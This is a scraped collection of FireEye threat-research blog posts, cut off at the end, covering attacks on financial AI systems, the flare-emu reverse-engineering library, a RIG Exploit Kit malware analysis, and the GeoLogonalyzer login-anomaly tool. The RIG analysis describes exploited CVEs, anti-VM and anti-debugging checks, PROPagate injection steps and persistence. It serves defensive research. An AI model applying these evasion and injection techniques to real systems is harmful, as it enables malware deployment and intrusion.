                "text": "Currently, threat actors possess limited access to the technology required to conduct disruptive operations against financial artificial intelligence (AI) systems and the risk of this targeting type remains low. However, there is a high risk of threat actors leveraging AI as part of disinformation campaigns to cause financial panic. As AI financial tools become more commonplace, adversarial methods to exploit these tools will also become more available, and operations targeting the financial industry will be increasingly likely in the future. AI Compounds Both Efficiency and Risk Financial entities increasingly rely on AI-enabled applications to streamline daily operations, assess client risk, and detect insider trading. However, researchers have demonstrated how exploiting vulnerabilities in certain AI models can adversely affect the final performance of a system. Cyber threat actors can potentially leverage these weaknesses for financial disruption or economic gain in the future. Recent advances in adversarial AI research highlights the vulnerabilities in some AI techniques used by the financial sector. Data poisoning attacks , or manipulating a model's training data, can affect the end performance of a system by leading the model to generate inaccurate outputs or assessments. Manipulating the data used to train a model can be particularly powerful if it remains undetected, since \"finished\" models are often trusted implicitly. It should be noted that adversarial AI research demonstrates how anomalies in a model do not necessarily point users toward a wrong answer, but redirect users away from the more correct output. Additionally some cases of compromise require threat actors to obtain a copy of the model itself, through reverse engineering or compromising the machine learning pipeline of the target. The following are some vulnerabilities that assume this white-box knowledge of the models under attack: Classifiers are used for detection and identification, such as object recognition in driverless cars and malware detection in networks. Researchers have demonstrated how these classifiers can be susceptible to evasion , meaning objects can be misclassified due to inherent weaknesses in the mode (Figure 1). Figure 1: Examples of classifier evasion where AI models identified 6 as 2 Researchers have highlighted how data poisoning can influence the outputs of AI recommendation systems. By changing reward pathways, adversaries can make a model suggest a suboptimal output such as reckless trades resulting in substantial financial losses. Additionally, groups have demonstrated a data-poisoning attack where attackers did not have control over how the training data was labeled. Natural language processing applications can analyze text and generate a basic understanding of the opinions expressed, also known as sentiment analysis. Recent papers highlight how users can input corrupt text training examples into sentiment analysis models to degrade the model's overall performance and guide it to misunderstand a body of text. Compromises can also occur when the threat actor has limited access and understanding of the model’s inner-workings. Researchers have demonstrated how open access to the prediction functions of a model as well as knowledge transfer can also facilitate compromise. How Financial Entities Leverage AI AI can process large amounts of information very quickly, and financial institutions are adopting AI-enabled tools to make accurate risk assessments and streamline daily operations. As a result, threat actors likely view financial service AI tools as an attractive target to facilitate economic gain or financial instability (Figure 2). Figure 2: Financial AI tools and their weaknesses Sentiment Analysis Use Branding and reputation are variables that help analysts plan future trade activity and examine potential risks associated with a business. News and online discussions offer a wealth of resources to examine public sentiment . AI techniques, such as natural language processing, can help analysts quickly identify public discussions referencing a business and examine the sentiment of these conversations to inform trades or help assess the risks associated with a firm. Potential Exploitation Threat actors can potentially insert fraudulent data that could generate erroneous analyses regarding a publicly traded firm. For example, threat actors could distribute false negative information about a company that could have adverse effects on a business' future trade activity or lead to a damaging risk assessment. Manipulating the data used to train a model can be particularly powerful if it remains undetected, since \"finished\" models are often trusted implicitly. Threat Actors Using Disinformation to Cause Financial Panic FireEye assess with high confidence that there is a high risk of threat actors spreading false information that triggers AI enabled trading and causes financial panic. Additionally, threat actors can leverage AI techniques to generate manipulated multimedia or \"deep fakes\" to facilitate such disruption. False information can have considerable market-wide effects. Malicious actors have a history of distributing false information to facilitate financial instability. For example, in April 2013, the Syrian Electronic Army (SEA) compromised the Associated Press (AP) Twitter account and announced that the White House was attacked and President Obama sustained injuries. After the false information was posted, stock prices plummeted. Figure 3: Tweet from the Syrian Electronic Army (SEA) after compromising Associated Press's Twitter account Malicious actors distributed false messaging that triggered bank runs in Bulgaria and Kazakhstan in 2014. In two separate incidents, criminals sent emails, text messages, and social media posts suggesting bank deposits were not secure, causing customers to withdraw their savings en masse. Threat actors can use AI to create manipulated multimedia videos or \" deep fakes \" to spread false information about a firm or market-moving event. Threat actors can also use AI applications to replicate the voice of a company's leadership to conduct fraudulent trades for financial gain. We have observed one example where a manipulated video likely impacted the outcome of a political campaign. Portfolio Management Use Several financial institutions are employing AI applications to select stocks for investment funds , or in the case of AI-based hedge funds , automatically conduct trades to maximize profits. Financial institutions can also leverage AI applications to help customize a client's trade portfolio. AI applications can analyze a client's previous trade activity and propose future trades analogous to those already found in a client's portfolio. Potential Exploitation Actors could influence recommendation systems to redirect a hedge fund toward irreversible bad trades, causing the company to lose money (e.g., flooding the market with trades that can confuse the recommendation system and cause the system to start trading in a way that damages the company). Moreover, many of the automated trading tools used by hedge funds operate without human supervision and conduct trade activity that directly affects the market. This lack of oversight could leave future automated applications more vulnerable to exploitation as there is no human in the loop to detect anomalous threat activity. Threat Actors Conducting Suboptimal Trades We assess with moderate confidence that manipulating trade recommendation systems poses a moderate risk to AI-based portfolio managers. The diminished human involvement with trade recommendation systems coupled with the irreversibility of trade activity suggest that adverse recommendations could quickly escalate to a large-scale impact. Additionally, operators can influence recommendation systems without access to sophisticated AI technologies; instead, using knowledge of the market and mass trades to degrade the application's performance. We have previously observed malicious actors targeting trading platforms and exchanges, as well as compromising bank networks to conduct manipulated trades. Both state-sponsored and financially motivated actors have incentives to exploit automated trading tools to generate profit, destabilize markets, or weaken foreign currencies. Russian hackers reportedly leveraged Corkow malware to place $500M worth of trades at non-market rates, briefly destabilizing the dollar-ruble exchange rate in February 2015. Future criminal operations can leverage vulnerabilities in automatic training algorithms to disrupt the market with a flood of automated bad trades. Compliance and Fraud Detection Use Financial institutions and regulators are leveraging AI-enabled anomaly detection tools to ensure that traders are not engaging in illegal activity. These tools can examine trade activity, internal communications , and other employee data to ensure that workers are not capitalizing on advanced knowledge of the market to engage in fraud, theft, insider trading, or embezzlement. Potential Exploitation Sophisticated threat actors can exploit the weaknesses in classifiers to alter an AI-based detection tool and mischaracterize anomalous illegal activity as normal activity. Manipulating the model helps insider threats conduct criminal activity without fear of discovery. Threat Actors Camouflaging Insider Threat Activity Currently threat actors possess limited access to the kind of technology required to evade these fraud detection systems, and therefore with high confidence we assess that the threat of this activity type remains low. However, as AI financial tools become more commonplace, adversarial methods to exploit these tools will also become more available and insider threats leveraging AI to evade detection will likely increase in the future. Underground forums and social media posts demonstrate there is a market for individuals with insider access to financial institutions. Insider threats could exploit weaknesses in AI-based anomaly detectors to camouflage nefarious activity, such as external communications, erratic trades, and data transfers, as normal activity. Trade Simulation Use Financial entities can use AI tools that leverage historical data from previous trade activity to simulate trades and examine their effects. Quant-fund managers and high-speed traders can use this capability to strategically plan future activity, such as the optimal time of the day to trade. Additionally, financial insurance underwriters can use these tools to observe the impact of market-moving activity and generate better risk assessments. Potential Exploitation By exploiting inherent weaknesses in an AI model, threat actors could lull a company into a false sense of security regarding the way a trade will play out. Specifically, threat actors could find out when a company is training their model and inject corrupt data into a dataset being used to train the model. Subsequently, the end application generates an incorrect simulation of potential trades and their consequences. These models are regularly trained on the latest financial information to improve a simulation's performance, providing threat actors with multiple opportunities for data poisoning attacks. Additionally, some high-speed traders speculate that threats could flood the market with fake sell orders to confuse trading algorithms and potentially cause the market to crash . FireEye Threat Intelligence has previously examined how financially motivated actors can leverage data manipulation for profit through pump and dump scams and stock manipulation. Threat Actors Conducting Insider Trading FireEye assesses with moderate confidence that the current risk of threat actors leveraging these attacks is low as exploitations of trade simulations require sophisticated technology as well as additional insider intelligence regarding when a financial company is training their model. Despite these limitations, as financial AI tools become more popular, adversarial methods to exploit these tools are also likely to become more commonplace on underground forums and via state-sponsored threats. Future financially motivated operations could monitor or manipulate trade simulation tools as another means of gaining advanced knowledge of upcoming market activity. Risk Assessment and Modeling Use AI can help the financial insurance sector's underwriting process by examining client data and highlighting features that it considers vulnerable prior to market-moving actions (joint ventures, mergers & acquisitions, research & development breakthroughs, etc.). Creating an accurate insurance policy ahead of market catalysts requires a risk assessment to highlight a client's potential weaknesses. Financial services can also employ AI applications to improve their risk models . Advances in generative adversarial networks can help risk management by stress-testing a firm's internal risk model to evaluate performance or highlight potential vulnerabilities in a firm's model. Potential Exploitation If a country is conducting market-moving events with a foreign business, state-sponsored espionage actors could use data poisoning attacks to cause AI models to over or underestimate the value or risk associated with a firm to gain a competitive advantage ahead of planned trade activity. For example, espionage actors could feasibly use this knowledge and help turn a joint venture into a hostile takeover or eliminate a competitor in a bidding process. Additionally, threat actors can exploit weaknesses in financial AI tools as part of larger third-party compromises against high-value clients. Threat Actors Influencing Trade Deals and Negotiations With high confidence, we consider the current threat risk to trade activity and business deals to be low, but as more companies leverage AI applications to help prepare for market-moving catalysts, these applications will likely become an attack surface for future espionage operations. In the past, state-sponsored actors have employed espionage operations during collaborations with foreign companies to ensure favorable business deals. Future state-sponsored espionage activity could leverage weaknesses in financial modeling tools to help nations gain a competitive advantage. Outlook and Implications Businesses adopting AI applications should be aware of the risks and vulnerabilities introduced with these technologies, as well as the potential benefits. It should be noted that AI models are not static; they are routinely updated with new information to make them more accurate. This constant model training frequently leaves them vulnerable to manipulation. Companies should remain vigilant and regularly audit their training data to eliminate poisoned inputs. Additionally, where applicable, AI applications should incorporate human supervision to ensure that erroneous outputs or recommendations do not automatically result in financial disruption. AI's inherent limitations also pose a problem as the financial sector increasingly adopts these applications for their operations. The lack of transparency in how a model arrived at its answer is problematic for analysts who are using AI recommendations to conduct trades. Without an explanation for its output , it is difficult to determine liability when a trade has negative outcomes. This lack of clarity can lead analysts to mistrust an application and eventually refrain from using it altogether. Additionally, the rise of data privacy laws may also accelerate the need for explainable AI in the financial sector. Europe's General Data Protection Regulation (GDPR) stipulates that companies employing AI applications must have an explanation for decisions made by its models . Some financial institutions have begun addressing this explainability problem by developing AI models that are inherently more transparent. Researchers have also developed self-explaining neural networks , which provide understandable explanations for the outputs generated by the system. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/12/automating-objective-c-code-analysis-with-emulation.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-12-12",
                    "source": "www.fireeye.com"
                },
                "text": "This blog post is the next episode in the FireEye Labs Advanced Reverse Engineering (FLARE) team Script Series. Today, we are sharing a new IDAPython library – flare-emu – powered by IDA Pro and the Unicorn emulation framework that provides scriptable emulation features for the x86, x86_64, ARM, and ARM64 architectures to reverse engineers. Along with this library, we are also sharing an Objective-C code analysis IDAPython script that uses it. Read on to learn some creative ways that emulation can help solve your code analysis problems and how to use our new IDAPython library to save you lots of time in the process. Why Emulation? If you haven’t employed emulation as a means to solve a code analysis problem, then you are missing out! I will highlight some of its benefits and a few use cases in order to give you an idea of how powerful it can be. Emulation is flexible, and many emulation frameworks available today, including Unicorn, are cross-platform. With emulation, you choose which code to emulate and you control the context under which it is executed. Because the emulated code cannot access the system services of the operating system under which it is running, there is little risk of it causing damage. All of these benefits make emulation a great option for ad-hoc experimentation, problem solving, or automation. Use Cases Decoding/Decryption/Deobfuscation/Decompress – Often during malicious code analysis you will come across a function used to decode, decompress, decrypt, or deobfuscate some useful data such as strings, configuration data, or another payload. If it is a common algorithm, you may be able to identify it by sight or with a plug-in such as signsrch . Unfortunately, this is not often the case. You are then left to either opening up a debugger and instrumenting the sample to decode it for you, or transposing the function by hand into whatever programming language fits your needs at the time. These options can be time consuming and problematic depending on the complexity of the code and the sample you are analyzing. Here, emulation can often provide a preferable third option. Writing a script that emulates the function for you is akin to having the function available to you as if you wrote it or are calling it from a library. This allows you to reuse the function as many times as it’s needed, with varying inputs, without having to open a debugger. This case also applies to self-decrypting shellcode, where you can have the code decrypt itself for you. Data Tracking – With emulation, you have the power to stop and inspect the emulation context at any time using an instruction hook. Pairing a disassembler with an emulator allows you to pause emulation at key instructions and inspect the contents of registers and memory. This allows you to keep tabs on interesting data as it flows through a function. This can have several applications. As previously covered in other blogs in the FLARE script series, Automating Function Argument Extraction and Automating Obfuscated String Decoding , this technique can be used to track the arguments passed to a given function throughout an entire program. Function argument tracking is one of the techniques employed by the Objective-C code analysis tool introduced later in this post. The data tracking technique could also be employed to track the this pointer in C++ code in order to markup object member references, or the return values from calls to GetProcAddress/dlsym in order to rename the variables they are stored in appropriately. There are many possibilities. Introducing flare-emu The FLARE team is introducing an IDAPython library, flare-emu , that marries IDA Pro’s binary analysis capabilities with Unicorn’s emulation framework to provide the user with an easy to use and flexible interface for scripting emulation tasks. flare-emu is designed to handle all the housekeeping of setting up a flexible and robust emulator for its supported architectures so that you can focus on solving your code analysis problems. It currently provides three different interfaces to serve your emulation needs, along with a slew of related helper and utility functions. emulateRange – This API is used to emulate a range of instructions, or a function, within a user-specified context. It provides options for user-defined hooks for both individual instructions and for when “call” instructions are encountered. The user can decide whether the emulator will skip over, or call into function calls. Figure 1 shows emulateRange used with both an instruction and call hook to track the return value of GetProcAddress calls and rename global variables to the name of the Windows APIs they will be pointing to. In this example, it was only set to emulate from 0x401514 to 0x40153D .  This interface provides an easy way for the user to specify values for given registers and stack arguments. If a bytestring is specified, it is written to the emulator’s memory and the pointer is written to the register or stack variable. After emulation, the user can make use of flare-emu ’s utility functions to read data from the emulated memory or registers, or use the Unicorn emulation object that is returned for direct probing in case flare-emu does not expose some functionality you require. A small wrapper function for emulateRange , named emulateSelection , can be used to emulate the range of instructions currently highlighted in IDA Pro. Figure 1: emulateRange being used to track the return value of GetProcAddress iterate – This API is used to force emulation down specific branches within a function in order to reach a given target. The user can specify a list of target addresses, or the address of a function from which a list of cross-references to the function is used as the targets, along with a callback for when a target is reached. The targets will be reached, regardless of conditions during emulation that may have caused different branches to be taken. Figure 2 illustrates a set of code branches that iterate has forced to be taken in order to reach its target; the flags set by the cmp instructions are irrelevant.  Like the emulateRange API, options for user-defined hooks for both individual instructions and for when “call” instructions are encountered are provided. An example use of the iterate API is for the function argument tracking technique mentioned earlier in this post. Figure 2: A path of emulation determined by the iterate API in order to reach the target address emulateBytes – This API provides a way to simply emulate a blob of extraneous shellcode. The provided bytes are not added to the IDB and are simply emulated as is. This can be useful for preparing the emulation environment. For example, flare-emu itself uses this API to manipulate a Model Specific Register (MSR) for the ARM64 CPU that is not exposed by Unicorn in order to enable Vector Floating Point (VFP) instructions and register access. Figure 3 shows the code snippet that achieves this. Like with emulateRange , the Unicorn emulation object is returned for further probing by the user in case flare-emu does not expose some functionality required by the user. Figure 3: flare-emu using emulateBytes to enable VFP for ARM64 API Hooking As previously stated, flare-emu is designed to make it easy for you to use emulation to solve your code analysis needs. One of the pains of emulation is in dealing with calls into library functions. While flare-emu gives you the option to simply skip over call instructions, or define your own hooks for dealing with specific functions within your call hook routine, it also comes with predefined hooks for over 80 functions! These functions include many of the common C runtime functions for string and memory manipulation that you will encounter, as well as some of their Windows API counterparts. Examples Figure 4 shows a few blocks of code that call a function that takes a timestamp value and converts it to a string. Figure 5 shows a simple script that uses flare-emu ’s iterate API to print the arguments passed to this function for each place it is called. The script also emulates a simple XOR decode function and prints the resulting, decoded string. Figure 6 shows the resulting output of the script. Figure 4: Calls to a timestamp conversion function Figure 5: Simple example of flare-emu usage Figure 6: Output of script shown in Figure 5 Here is a sample script that uses flare-emu to track return values of GetProcAddress and rename the variables they are stored in accordingly. Check out our README for more examples and help with flare-emu . Introducing objc2_analyzer Last year, I wrote a blog post to introduce you to reverse engineering Cocoa applications for macOS . That post included a short primer on how Objective-C methods are called under the hood, and how this adversely affects cross-references in IDA Pro and other disassemblers. An IDAPython script named objc2_xrefs_helper was also introduced in the post to help fix these cross-references issues. If you have not read that blog post, I recommend reading it before continuing on reading this post as it provides some context for what makes objc2_analyzer particularly useful. A major shortcoming of objc2_xrefs_helper was that if a selector name was ambiguous, meaning that two or more classes implement a method with the same name, the script was unable to determine which class the referenced selector belonged to at any given location in the binary and had to ignore such cases when fixing cross-references. Now, with emulation support, this is no longer the case. objc2_analyzer uses the iterate API from flare-emu along with instruction and call hooks that perform Objective-C disassembly analysis in order to determine the id and selector being passed for every call to objc_msgSend variants in a binary. As an added bonus, it can also catch calls made to objc_msgSend variants when the function pointer is stored in a register, which is a very common pattern in Clang (the compiler used by modern versions of Xcode). IDA Pro tries to catch these itself and does a pretty good job, but it doesn’t catch them all. In addition to x86_64, support was also added for the ARM and ARM64 architectures in order to support reverse engineering iOS applications. This script supersedes the older objc2_xrefs_helper script, which has been removed from our repo. And, since the script can perform such data tracking in Objective-C code by using emulation, it can also determine whether an id is a class instance or a class object itself. Additional support has been added to track ivars being passed as ids as well. With all this information, Objective-C-style pseudocode comments are added to each call to objc_msgSend variants that represent the method call being made at each location. An example of the script’s capability is shown in Figure 7 and Figure 8. Figure 7: Objective-C IDB snippet before running objc2_analyzer Figure 8: Objective-C IDB snippet after running objc2_analyzer Observe the instructions referencing selectors have been patched to instead reference the implementation function itself, for easy transition. The comments added to each call make analysis much easier. Cross-references from the implementation functions are also created to point back to the objc_msgSend calls that reference them as shown in Figure 9. Figure 9: Cross-references added to IDB for implementation function It should be noted that every release of IDA Pro starting with 7.0 have brought improvements to Objective-C code analysis and handling. However, at the time of writing, the latest version of IDA Pro being 7.2, there are still shortcomings that are mitigated using this tool as well as the immensely helpful comments that are added. objc2_analyzer is available, along with our other IDA Pro plugins and scripts , at our GitHub page. Conclusion flare-emu is a flexible tool to include in your arsenal that can be applied to a variety of code analysis problems. Several example problems were presented and solved using it in this blog post, but this is just a glimpse of its possible applications. If you haven’t given emulation a try for solving your code analysis problems, we hope you will now consider it an option. And for all, we hope you find value in using these new tools! Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2017/03/introducing_monitor.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": null,
                    "source": "www.fireeye.com"
                },
                "text": ""
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/06/rig-ek-delivering-monero-miner-via-propagate-injection-technique.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-06-28",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction Through FireEye Dynamic Threat Intelligence (DTI), we observed RIG Exploit Kit (EK) delivering a dropper that leverages the PROPagate injection technique to inject code that downloads and executes a Monero miner (similar activity has been reported by Trend Micro ). Apart from leveraging a relatively lesser known injection technique, the attack chain has some other interesting properties that we will touch on in this blog post. Attack Chain The attack chain starts when the user visits a compromised website that loads the RIG EK landing page in an iframe. The RIG EK uses various techniques to deliver the NSIS (Nullsoft Scriptable Install System) loader, which leverages the PROPagate injection technique to inject shellcode into explorer.exe. This shellcode executes the next payload, which downloads and executes the Monero miner. The flow chart for the attack chain is shown in Figure 1. Figure 1: Attack chain flow chart Exploit Kit Analysis When the user visits a compromised site that is injected with an iframe, the iframe loads the landing page. The iframe injected into a compromised website is shown in Figure 2. Figure 2: Injected iframe The landing page contains three different JavaScripts snippets, each of which uses a different technique to deliver the payload. Each of these are not new techniques, so we will only be giving a brief overview of each one in this post. JavaScript 1 The first JavaScript has a function, fa, which returns a VBScript that will be executed using the execScript function, as shown by the code in Figure 3. Figure 3: JavaScript 1 code snippet The VBScript exploits CVE-2016-0189 which allows it to download the payload and execute it using the code snippet seen in Figure 4. Figure 4: VBScript code snippet JavaScript 2 The second JavaScript contains a function that will retrieve additional JavaScript code and append this script code to the HTML page using the code snippet seen in Figure 5. Figure 5: JavaScript 2 code snippet This newly appended JavaScript exploits CVE-2015-2419 which utilizes a vulnerability in JSON.stringify. This script obfuscates the call to JSON.stringify by storing pieces of the exploit in the variables shown in Figure 6. Figure 6: Obfuscation using variables Using these variables, the JavaScript calls JSON.stringify with malformed parameters in order to trigger CVE-2015-2419 which in turn will cause native code execution, as shown in Figure 7. Figure 7: Call to JSON.Stringify JavaScript 3 The third JavaScript has code that adds additional JavaScript, similar to the second JavaScript. This additional JavaScript adds a flash object that exploits CVE-2018-4878 , as shown in Figure 8. Figure 8: JavaScript 3 code snippet Once the exploitation is successful, the shellcode invokes a command line to create a JavaScript file with filename u32.tmp, as shown in Figure 9. Figure 9: WScript command line This JavaScript file is launched using WScript, which downloads the next-stage payload and executes it using the command line in Figure 10. Figure 10: Malicious command line Payload Analysis For this attack, the actor has used multiple payloads and anti-analysis techniques to bypass the analysis environment. Figure 11 shows the complete malware activity flow chart. Figure 11: Malware activity flow chart Analysis of NSIS Loader (SmokeLoader) The first payload dropped by the RIG EK is a compiled NSIS executable famously known as SmokeLoader. Apart from NSIS files, the payload has two components: a DLL, and a data file (named ‘kumar.dll’ and ‘abaram.dat’ in our analysis case). The DLL has an export function that is invoked by the NSIS executable. This export function has code to read and decrypt the data file, which yields the second stage payload (a portable executable file). The DLL then spawns itself (dropper) in SUSPENDED_MODE and injects the decrypted PE using process hollowing. Analysis of Injected Code (Second Stage Payload) The second stage payload is a highly obfuscated executable. It consists of a routine that decrypts a chunk of code, executes it, and re-encrypts it. At the entry point, the executable contains code that checks the OS major version, which it extracts from the Process Environment Block (PEB). If the OS version value is less than 6 (prior to Windows Vista), the executable terminates itself. It also contains code that checks whether the executable is in debugged mode, which it extracts from offset 0x2 of the PEB. If the BeingDebugged flag is set, the executable terminates itself. The malware also implements an Anti-VM check by opening the registry key HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum with value 0. It checks whether the registry value data contains any of the strings: vmware, virtual, qemu, or xen.  Each of these strings is indictative of virtual machines After running the anti-analysis and environment check, the malware starts executing the core code to perform the malicious activity. The malware uses the PROPagate injection method to inject and execute the code in a targeted process. The PROPagate method is similar to the SetWindowLong injection technique. In this method, the malware uses the SetPropA function to modify the callback for UxSubclassInfo and cause the remote process to execute the malicious code. This code injection technique only works for a process with lesser or equal integrity level. The malware first checks whether the integrity of the current running process is medium integrity level (2000, SECURITY_MANDATORY_MEDIUM_RID). Figure 12 shows the code snippet. Figure 12: Checking integrity level of current process If the process is higher than medium integrity level, then the malware proceeds further. If the process is lower than medium integrity level, the malware respawns itself with medium integrity. The malware creates a file mapping object and writes the dropper file path to it and the same mapping object is accessed by injected code, to read the dropper file path and delete the dropper file. The name of the mapping object is derived from the volume serial number of the system drive and a XOR operation with the hardcoded value (Figure 13). File Mapping Object Name = “Volume Serial Number” + “Volume Serial Number” XOR 0x7E766791 Figure 13: Creating file mapping object name The malware then decrypts the third stage payload using XOR and decompresses it with RTLDecompressBuffer. The third stage payload is also a PE executable, but the author has modified the header of the file to avoid it being detected as a PE file in memory scanning. After modifying several header fields at the start of decrypted data, we can get the proper executable header (Figure 14). Figure 14: Injected executable without header (left), and with header (right) After decrypting the payload, the malware targets the shell process, explorer.exe, for malicious code injection. It uses GetShellWindow and GetWindowThreadProcessId APIs to get the shell window’s thread ID (Figure 15). Figure 15: Getting shell window thread ID The malware injects and maps the decrypted PE in a remote process (explorer.exe). It also injects shellcode that is configured as a callback function in SetPropA. After injecting the payload into the target process, it uses EnumChild and EnumProps functions to enumerate all entries in the property list of the shell window and compares it with UxSubclassInfo After finding the UxSubclassInfo property of the shell window, it saves the handle info and uses it to set the callback function through SetPropA. SetPropA has three arguments, the third of which is data. The callback procedure address is stored at the offset 0x14 from the beginning of data. Malware modifies the callback address with the injected shellcode address (Figure 16). Figure 16: Modifying callback function The malware then sends a specific message to the window to execute the callback procedure corresponding to the UxSubclassInfo property, which leads to the execution of the shellcode. The shellcode contains code to execute the address of the entry point of the injected third stage payload using CreateThread. It then resets the callback for SetPropA, which was modified by malware during PROPagate injection. Figure 17 shows the code snippet of the injected shellcode. Figure 17: Assembly view of injected shellcode Analysis of Third Stage Payload Before executing the malicious code, the malware performs anti-analysis checks to make sure no analysis tool is running in the system. It creates two infinitely running threads that contain code to implement anti-analysis checks. The first thread enumerates the processes using CreateToolhelp32Snapshot and checks for the process names generally used in analysis. It generates a DWORD hash value from the process name using a custom operation and compares it with the array of hardcoded DWORD values. If the generated value matches any value in the array, it terminates the corresponding process. The second thread enumerates the windows using EnumWindows. It uses GetClassNameA function to extract the class name associated with the corresponding window. Like the first thread, it generates a DWORD hash value from the class name using a custom operation and compares it with the array of hardcoded DWORD values. If the generated value matches any value in the array, it terminates the process related to the corresponding window. Other than these two anti-analysis techniques, it also has code to check the internet connectivity by trying to reach the URL: www.msftncsi[.]com/ncsi.txt. To remain persistent in the system, the malware installs a scheduled task and a shortcut file in %startup% folder. The scheduled task is named “Opera Scheduled Autoupdate {Decimal Value of GetTickCount()}”. The malware then communicates with the malicious URL to download the final payload, which is a Monero miner. It creates a MD5 hash value using Microsoft CryptoAPIs from the computer name and the volume information and sends the hash to the server in a POST request. Figure 18 shows the network communication. Figure 18: Network communication The malware then downloads the final payload, the Monero miner, from the server and installs it in the system. Conclusion Although we have been observing a decline in Exploit Kit activity, attackers are not abandoning them altogether. In this blog post, we explored how RIG EK is being used with various exploits to compromise endpoints. We have also shown how the NSIS Loader leverages the lesser known PROPagate process injection technique, possibly in an attempt to evade security products. FireEye MVX and the FireEye Endpoint Security (HX) platform detect this attack at several stages of the attack chain. Acknowledgement We would like to thank Sudeep Singh and Alex Berry for their contributions to this blog post. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/05/remote-authentication-geofeasibility-tool-geologonalyzer.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-05-29",
                    "source": "www.fireeye.com"
                },
                "text": "Users have long needed to access important resources such as virtual private networks (VPNs), web applications, and mail servers from anywhere in the world at any time. While the ability to access resources from anywhere is imperative for employees, threat actors often leverage stolen credentials to access systems and data. Due to large volumes of remote access connections, it can be difficult to distinguish between a legitimate and a malicious login. Today, we are releasing GeoLogonalyzer to help organizations analyze logs to identify malicious logins based on GeoFeasibility; for example, a user connecting to a VPN from New York at 13:00 is unlikely to legitimately connect to the VPN from Australia five minutes later. Once remote authentication activity is baselined across an environment, analysts can begin to identify authentication activity that deviates from business requirements and normalized patterns, such as: User accounts that authenticate from two distant locations, and at times between which the user probably could not have physically travelled the route. User accounts that usually log on from IP addresses registered to one physical location such as a city, state, or country, but also have logons from locations where the user is not likely to be physically located. User accounts that log on from a foreign location at which no employees reside or are expected to travel to, and your organization has no business contacts at that location. User accounts that usually log on from one source IP address, subnet, or ASN, but have a small number of logons from a different source IP address, subnet, or ASN. User accounts that usually log on from home or work networks, but also have logons from an IP address registered to cloud server hosting providers. User accounts that log on from multiple source hostnames or with multiple VPN clients. GeoLogonalyzer can help address these and similar situations by processing authentication logs containing timestamps, usernames, and source IP addresses. GeoLogonalyzer can be downloaded from our FireEye GitHub . GeoLogonalyzer Features IP Address GeoFeasibility Analysis For a remote authentication log that records a source IP address, it is possible to estimate the location each logon originated from using data such as MaxMind’s free GeoIP database . With additional information, such as a timestamp and username, analysts can identify a change in source location over time to determine if that user could have possibly traveled between those two physical locations to legitimately perform the logons. For example, if a user account, Meghan, logged on from New York City, New York on 2017-11-24 at 10:00:00 UTC and then logged on from Los Angeles, California 10 hours later on 2017-11-24 at 20:00:00 UTC, that is roughly a 2,450 mile change over 10 hours. Meghan’s logon source change can be normalized to 245 miles per hour which is reasonable through commercial airline travel. If a second user account, Harry, logged on from Dallas, Texas on 2017-11-25 at 17:00:00 UTC and then logged on from Sydney, Australia two hours later on 2017-11-25 at 19:00:00 UTC, that is roughly an 8,500 mile change over two hours. Harry’s logon source change can be normalized to 4,250 miles per hour, which is likely infeasible with modern travel technology. By focusing on the changes in logon sources, analysts do not have to manually review the many times that Harry might have logged in from Dallas before and after logging on from Sydney. Cloud Data Hosting Provider Analysis Attackers understand that organizations may either be blocking or looking for connections from unexpected locations. One solution for attackers is to establish a proxy on either a compromised server in another country, or even through a rented server hosted in another country by companies such as AWS, DigitalOcean, or Choopa. Fortunately, Github user “client9” tracks many datacenter hosting providers in an easily digestible format. With this information, we can attempt to detect attackers utilizing datacenter proxy to thwart GeoFeasibility analysis. Using GeoLogonalyzer Usable Log Sources GeoLogonalyzer is designed to process remote access platform logs that include a timestamp, username, and source IP. Applicable log sources include, but are not limited to: VPN Email client or web applications Remote desktop environments such as Citrix Internet-facing applications Usage GeoLogonalyzer’s built-in –csv input type accepts CSV formatted input with the following considerations: Input must be sorted by timestamp. Input timestamps must all be in the same time zone, preferably UTC, to avoid seasonal changes such as daylight savings time. Input format must match the following CSV structure – this will likely require manually parsing or reformatting existing log formats: YYYY-MM-DD HH:MM:SS, username, source IP, optional source hostname, optional VPN client details GeoLogonalyzer’s code comments include instructions for adding customized log format support. Due to the various VPN log formats exported from VPN server manufacturers, version 1.0 of GeoLogonalyzer does not include support for raw VPN server logs. GeoLogonalyzer Usage Example Input Figure 1 represents an example input VPNLogs.csv file that recorded eight authentication events for the two user accounts Meghan and Harry. The input data is commonly derived from logs exported directly from an application administration console or SIEM.  Note that this example dataset was created entirely for demonstration purposes. Figure 1: Example GeoLogonalyzer input Example Windows Executable Command GeoLogonalyzer.exe --csv VPNLogs.csv --output GeoLogonalyzedVPNLogs.csv Example Python Script Execution Command python GeoLogonalyzer.py --csv VPNLogs.csv --output GeoLogonalyzedVPNLogs.csv Example Output Figure 2 represents the example output GeoLogonalyzedVPNLogs.csv file, which shows relevant data from the authentication source changes (highlights have been added for emphasis and some columns have been removed for brevity): Figure 2: Example GeoLogonalyzer output Analysis In the example output from Figure 2, GeoLogonalyzer helps identify the following anomalies in the Harry account’s logon patterns: FAST - For Harry to physically log on from New York and subsequently from Australia in the recorded timeframe, Harry needed to travel at a speed of 4,297 miles per hour. DISTANCE – Harry’s 8,990 mile trip from New York to Australia might not be expected travel. DCH – Harry’s logon from Australia originated from an IP address associated with a datacenter hosting provider. HOSTNAME and CLIENT – Harry logged on from different systems using different VPN client software, which may be against policy. ASN – Harry’s source IP addresses did not belong to the same ASN. Using ASN analysis helps cut down on reviewing logons with different source IP addresses that belong to the same provider. Examples include logons from different campus buildings or an updated residential IP address. Manual analysis of the data could also reveal anomalies such as: Countries or regions where no business takes place, or where there are no employees located Datacenters that are not expected ASN names that are not expected, such as a university Usernames that should not log on to the service Unapproved VPN client software names Hostnames that are not part of the environment, do not match standard naming conventions, or do not belong to the associated user While it may be impossible to determine if a logon pattern is malicious based on this data alone, analysts can use GeoLogonalyzer to flag and 